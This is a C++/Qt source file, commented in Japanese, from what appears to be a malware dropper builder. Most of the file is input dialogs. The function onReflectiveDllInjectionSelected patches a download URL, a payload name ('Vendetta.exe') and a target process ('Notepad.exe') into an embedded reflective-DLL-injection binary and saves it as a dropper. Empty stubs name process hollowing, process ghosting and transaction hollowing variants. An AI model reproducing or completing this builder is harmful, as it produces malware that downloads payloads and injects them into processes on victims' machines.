#include "mainwindow.h"


std::tuple<std::wstring, std::wstring, std::wstring, std::wstring> UrlDialog(
    const QString &title,
    const QString &protocol = "http://",
    const QString &defaultIp = "127.0.0.1",
    const QString &defaultPort = "5555",
    const QString &path = "index.html"
    )
{
    QDialog *dialog = new QDialog();
    dialog->setWindowTitle(title);

    // フィールド作成
    QLineEdit *protocolLineEdit = new QLineEdit(dialog);
    QLineEdit *ipLineEdit = new QLineEdit(dialog);
    QLineEdit *portLineEdit = new QLineEdit(dialog);
    QLineEdit *pathLineEdit = new QLineEdit(dialog);

    // 初期値設定
    protocolLineEdit->setText(protocol);
    ipLineEdit->setText(defaultIp);
    portLineEdit->setText(defaultPort);
    pathLineEdit->setText(path);

    // プレースホルダー
    protocolLineEdit->setPlaceholderText("例: " + protocol);
    ipLineEdit->setPlaceholderText("例: " + defaultIp);
    portLineEdit->setPlaceholderText("例: " + defaultPort);
    pathLineEdit->setPlaceholderText("例: " + path);

    // レイアウトの作成
    QFormLayout *formLayout = new QFormLayout;
    formLayout->addRow("プロトコル:", protocolLineEdit);
    formLayout->addRow("IPアドレス:", ipLineEdit);
    formLayout->addRow("ポート番号:", portLineEdit);
    formLayout->addRow("ファイルパス:", pathLineEdit);

    // ボタンの作成と配置
    QPushButton *okButton = new QPushButton("OK", dialog);
    QPushButton *cancelButton = new QPushButton("Cancel", dialog);

    // 入力データを格納する変数
    QString protocolResult, ipResult, portResult, pathResult;

    // ボタンの接続
    QObject::connect(okButton, &QPushButton::clicked, dialog, [&]() {
        protocolResult = protocolLineEdit->text();
        ipResult = ipLineEdit->text();
        portResult = portLineEdit->text();
        pathResult = pathLineEdit->text();

        // 空の入力があればエラーを表示
        if (protocolResult.isEmpty() || ipResult.isEmpty() || portResult.isEmpty() || pathResult.isEmpty()) {
            QMessageBox::critical(dialog, "エラー", "すべてのフィールドを入力してください。");
            return;
        }

        // 文字数制限をチェック
        if (protocolResult.size() > 200 || ipResult.size() > 200 || portResult.size() > 200 || pathResult.size() > 200) {
            QMessageBox::critical(dialog, "エラー", "文字数が200を超えています。");
            return;
        }

        // ダイアログを閉じる
        dialog->accept();
    });

    QObject::connect(cancelButton, &QPushButton::clicked, dialog, [&]() {
        dialog->reject();
    });

    QHBoxLayout *buttonLayout = new QHBoxLayout;
    buttonLayout->addWidget(okButton);
    buttonLayout->addWidget(cancelButton);

    // メインレイアウトの設定
    QVBoxLayout *mainLayout = new QVBoxLayout;
    mainLayout->addLayout(formLayout);
    mainLayout->addLayout(buttonLayout);
    dialog->setLayout(mainLayout);

    dialog->setFixedSize(400, 0);

    // ダイアログを表示
    if (dialog->exec() == QDialog::Accepted) {

        // 型変換
        std::wstring protocolW = protocolResult.toStdWString();
        std::wstring ipAddressW = ipResult.toStdWString();
        std::wstring portW = portResult.toStdWString();
        std::wstring filePathW = pathResult.toStdWString();

        // 文字列サイズをリサイズして確保
        protocolW.resize(255, L'\0');
        ipAddressW.resize(255, L'\0');
        portW.resize(255, L'\0');
        filePathW.resize(255, L'\0');

        // 文字列をタプルとして返す
        return std::make_tuple(protocolW, ipAddressW, portW, filePathW);
    } else {
        return std::make_tuple(L"", L"", L"", L"");
    }
}



std::tuple<std::wstring, std::wstring, std::wstring, std::wstring, std::wstring> UrlProcessNameDialog(
    const QString &title,
    const QString &protocol = "http://",
    const QString &defaultIp = "127.0.0.1",
    const QString &defaultPort = "5555",
    const QString &path = "index.html",
    const QString &processName = "explorer.exe")
{
    QDialog *dialog = new QDialog();
    dialog->setWindowTitle(title);

    // フィールド作成
    QLineEdit *protocolLineEdit = new QLineEdit(dialog);
    QLineEdit *ipLineEdit = new QLineEdit(dialog);
    QLineEdit *portLineEdit = new QLineEdit(dialog);
    QLineEdit *pathLineEdit = new QLineEdit(dialog);
    QLineEdit *processNameLineEdit = new QLineEdit(dialog);

    // 初期値設定
    protocolLineEdit->setText(protocol);
    ipLineEdit->setText(defaultIp);
    portLineEdit->setText(defaultPort);
    pathLineEdit->setText(path);
    processNameLineEdit->setText(processName);

    // プレースホルダー
    protocolLineEdit->setPlaceholderText("例: " + protocol);
    ipLineEdit->setPlaceholderText("例: " + defaultIp);
    portLineEdit->setPlaceholderText("例: " + defaultPort);
    pathLineEdit->setPlaceholderText("例: " + path);
    processNameLineEdit->setPlaceholderText("例: " + processName);

    // レイアウトの作成
    QFormLayout *formLayout = new QFormLayout;
    formLayout->addRow("プロトコル:", protocolLineEdit);
    formLayout->addRow("IPアドレス:", ipLineEdit);
    formLayout->addRow("ポート番号:", portLineEdit);
    formLayout->addRow("ファイルパス:", pathLineEdit);
    formLayout->addRow("プロセス名:", processNameLineEdit);

    // ボタンの作成と配置
    QPushButton *okButton = new QPushButton("OK", dialog);
    QPushButton *cancelButton = new QPushButton("Cancel", dialog);

    // 入力データを格納する変数
    QString protocolResult, ipResult, portResult, pathResult, processNameResult;

    // ボタンの接続
    QObject::connect(okButton, &QPushButton::clicked, dialog, [&]() {
        // OKボタンが押されたときの処理
        protocolResult = protocolLineEdit->text();
        ipResult = ipLineEdit->text();
        portResult = portLineEdit->text();
        pathResult = pathLineEdit->text();
        processNameResult = processNameLineEdit->text();

        // 空の入力があればエラーを表示
        if (protocolResult.isEmpty() || ipResult.isEmpty() || portResult.isEmpty() || pathResult.isEmpty() || processNameResult.isEmpty()) {
            QMessageBox::critical(dialog, "エラー", "すべてのフィールドを入力してください。");
            return;
        }

        // 文字数制限をチェック
        if (protocolResult.size() > 200 || ipResult.size() > 200 || portResult.size() > 200 || pathResult.size() > 200 || processNameResult.size() > 200) {
            QMessageBox::critical(dialog, "エラー", "文字数が200を超えています。");
            return;
        }

        // ダイアログを閉じる
        dialog->accept();
    });

    QObject::connect(cancelButton, &QPushButton::clicked, dialog, [&]() {
        dialog->reject();
    });

    QHBoxLayout *buttonLayout = new QHBoxLayout;
    buttonLayout->addWidget(okButton);
    buttonLayout->addWidget(cancelButton);

    // メインレイアウトの設定
    QVBoxLayout *mainLayout = new QVBoxLayout;
    mainLayout->addLayout(formLayout);
    mainLayout->addLayout(buttonLayout);
    dialog->setLayout(mainLayout);

    dialog->setFixedSize(400, 0);

    // ダイアログを表示
    if (dialog->exec() == QDialog::Accepted) {

        // 型変換
        std::wstring protocolW = protocolResult.toStdWString();
        std::wstring ipAddressW = ipResult.toStdWString();
        std::wstring portW = portResult.toStdWString();
        std::wstring filePathW = pathResult.toStdWString();
        std::wstring processNameW = processNameResult.toStdWString();

        // 文字列サイズをリサイズして確保
        protocolW.resize(255, L'\0');
        ipAddressW.resize(255, L'\0');
        portW.resize(255, L'\0');
        filePathW.resize(255, L'\0');
        processNameW.resize(255, L'\0');

        // 文字列をタプルとして返す
        return std::make_tuple(protocolW, ipAddressW, portW, filePathW, processNameW);
    } else {
        return std::make_tuple(L"", L"", L"", L"", L"");
    }
}

std::tuple<std::wstring, std::wstring, std::wstring, std::wstring, std::wstring> UrlFilePathDialog(
    const QString &title,
    const QString &protocol = "http://",
    const QString &defaultIp = "127.0.0.1",
    const QString &defaultPort = "5555",
    const QString &path = "index.html",
    const QString &filePath = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
    )
{
    QDialog *dialog = new QDialog();
    dialog->setWindowTitle(title);

    // フィールド作成
    QLineEdit *protocolLineEdit = new QLineEdit(dialog);
    QLineEdit *ipLineEdit = new QLineEdit(dialog);
    QLineEdit *portLineEdit = new QLineEdit(dialog);
    QLineEdit *pathLineEdit = new QLineEdit(dialog);
    QLineEdit *filePathEdit = new QLineEdit(dialog);

    // 初期値設定
    protocolLineEdit->setText(protocol);
    ipLineEdit->setText(defaultIp);
    portLineEdit->setText(defaultPort);
    pathLineEdit->setText(path);
    filePathEdit->setText(filePath);

    // プレースホルダー
    protocolLineEdit->setPlaceholderText("例: " + protocol);
    ipLineEdit->setPlaceholderText("例: " + defaultIp);
    portLineEdit->setPlaceholderText("例: " + defaultPort);
    pathLineEdit->setPlaceholderText("例: " + path);
    filePathEdit->setPlaceholderText("例: " + filePath);

    // レイアウトの作成
    QFormLayout *formLayout = new QFormLayout;
    formLayout->addRow("プロトコル:", protocolLineEdit);
    formLayout->addRow("IPアドレス:", ipLineEdit);
    formLayout->addRow("ポート番号:", portLineEdit);
    formLayout->addRow("ファイルパス:", pathLineEdit);
    formLayout->addRow("実行ファイルパス:", filePathEdit);

    // ボタンの作成と配置
    QPushButton *okButton = new QPushButton("OK", dialog);
    QPushButton *cancelButton = new QPushButton("Cancel", dialog);

    // 入力データを格納する変数
    QString protocolResult, ipResult, portResult, pathResult, filePathResult;

    // ボタンの接続
    QObject::connect(okButton, &QPushButton::clicked, dialog, [&]() {
        // OKボタンが押されたときの処理
        protocolResult = protocolLineEdit->text();
        ipResult = ipLineEdit->text();
        portResult = portLineEdit->text();
        pathResult = pathLineEdit->text();
        filePathResult = filePathEdit->text();

        // 空の入力があればエラー
        if (protocolResult.isEmpty() || ipResult.isEmpty() || portResult.isEmpty() || pathResult.isEmpty() || filePathResult.isEmpty()) {
            QMessageBox::critical(dialog, "エラー", "すべてのフィールドを入力してください。");
            return;
        }

        // 文字数制限チェック
        if (protocolResult.size() > 200 || ipResult.size() > 200 || portResult.size() > 200 || pathResult.size() > 200 || filePathResult.size() > 200) {
            QMessageBox::critical(dialog, "エラー", "文字数が200を超えています。");
            return;
        }

        dialog->accept();
    });

    QObject::connect(cancelButton, &QPushButton::clicked, dialog, [&]() {
        dialog->reject();
    });

    QHBoxLayout *buttonLayout = new QHBoxLayout;
    buttonLayout->addWidget(okButton);
    buttonLayout->addWidget(cancelButton);

    QVBoxLayout *mainLayout = new QVBoxLayout;
    mainLayout->addLayout(formLayout);
    mainLayout->addLayout(buttonLayout);
    dialog->setLayout(mainLayout);

    dialog->setFixedSize(400, 0);

    if (dialog->exec() == QDialog::Accepted) {

        // 型変換
        std::wstring protocolW = protocolResult.toStdWString();
        std::wstring ipAddressW = ipResult.toStdWString();
        std::wstring portW = portResult.toStdWString();
        std::wstring pathW = pathResult.toStdWString();
        std::wstring filePathW = filePathResult.toStdWString();

        // 文字列サイズをリサイズして確保
        protocolW.resize(255, L'\0');
        ipAddressW.resize(255, L'\0');
        portW.resize(255, L'\0');
        pathW.resize(255, L'\0');
        filePathW.resize(255, L'\0');

        // 文字列をタプルとして返す
        return std::make_tuple(protocolW, ipAddressW, portW, pathW, filePathW);
    } else {
        return std::make_tuple(L"", L"", L"", L"", L"");
    }
}





void WriteDataToMemory(wchar_t* dataPtr, const std::vector<std::wstring>& data, DWORD base, DWORD offset)
{
    for (size_t i = 0; i < data.size(); ++i) {
        std::wmemcpy(dataPtr + (base + i * offset) / sizeof(wchar_t), data[i].c_str(), data[i].size());
    }
}

// 反射型DLLインジェクションを使ったドロッパー生成
void MainWindow::onReflectiveDllInjectionSelected() {

    auto [protocol, ip, port, path, processName] = UrlProcessNameDialog(
        "反射型DLLインジェクションの引数",
        "http://",
        "127.0.0.1",
        "5555",
        "Vendetta.exe",
        "Notepad.exe"
        );



    if (protocol.empty() && ip.empty() && port.empty() && path.empty() && processName.empty()) {
        return;
    }

    // リソースファイルのパス
    QString resourcePath = ":/Injector/Resources/Injector/ReflectiveDLLInjection";

    // 開く
    QFile file(resourcePath);
    if (!file.open(QIODevice::ReadOnly)) {
        QMessageBox::critical(this, "エラー", "リソースファイルのオープンに失敗しました。");
        return;
    }

    QByteArray fileData = file.readAll();
    file.close();

    // ベースアドレスとオフセット
    wchar_t* dataPtr = reinterpret_cast<wchar_t*>(fileData.data());
    DWORD base = 0x40a0;
    DWORD offset = 0x1fe;



    // メモリにデータを書き込む
    std::vector<std::wstring> data = { protocol, ip, port, path, processName };
    WriteDataToMemory(dataPtr, data, base, offset);

    // 保存
    QString defaultPath = "Generated\\Dropper";
    SaveToFile(fileData, this, defaultPath);
}



// プロセスハロウィングを使ったドロッパー生成
void MainWindow::onProcessHollowingSelected(){

}

// 反射型DLL読み込みを使ったドロッパー生成
void MainWindow::onReflectiveDllLoadingSelected(){

}


// プロセスゴースティングを使ったドロッパー生成
void MainWindow::onProcessGhostingSelected(){

}

// トランザクションハロウィングを使ったドロッパー生成
void MainWindow::onTransactionHollowingSelected(){

}

